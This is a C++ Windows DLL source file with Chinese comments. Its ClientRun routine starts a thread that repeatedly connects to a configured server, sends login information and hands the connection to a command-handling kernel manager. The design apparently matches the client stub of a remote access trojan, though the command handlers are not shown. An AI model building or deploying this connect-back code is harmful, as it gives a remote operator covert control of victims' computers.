#include "Dll.h"

char __ServerAddress[MAX_PATH] = { 0 };
unsigned short __ConnectPort = 0;
HINSTANCE 	__InstanceHandle;

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		//代表一个exe模块（加载当前的dll模块）
		__InstanceHandle = (HINSTANCE)hModule;
		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}



void ClientRun(char* ServerIPAddress, USHORT ServerConnectPort)
{
	memcpy(__ServerAddress, ServerIPAddress, strlen(ServerIPAddress));
	__ConnectPort = ServerConnectPort;
	//启动一个工作线程
	HANDLE ThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure,
		NULL, 0, NULL);
	int a =GetLastError();
	//等待指定的对象处于信号状态或经过超时间隔。
	//等待工作线程的正常退出
	WaitForSingleObject(ThreadHandle, INFINITE);
	printf("client bye bye!!!\r\n");
	
	if (ThreadHandle!=NULL)
	{
		CloseHandle(ThreadHandle);
	}
}

DWORD WINAPI WorkThreadProcedure(LPVOID ParaeterData)
{
	_CIOCPClient IOCPClient;
	BOOL IsOk = FALSE;
	while (1)
	{
		if (IsOk==TRUE)
		{
			break;
		}

		//获得一个随机数
		DWORD TickCount = GetTickCount();
		//ConnectServer中请求接受数据的线程while(1)->m_ManagerObject()->HandleIO()等待数据到达
		if (!IOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
		{
			continue;
		}
		//与服务器建立了一个链接
		//发送第一波数据
		SendLoginInformation(&IOCPClient, GetTickCount() - TickCount);
		//构建接受数据的机制
		CKernelManager	KernelManagerObject(&IOCPClient);

		do
		{
			IsOk = WaitForSingleObject(IOCPClient.m_EventHandle, 100);

			IsOk = IsOk - WAIT_OBJECT_0;


		} while (IsOk!=0);
		IsOk = TRUE;
	}
	return 0;
}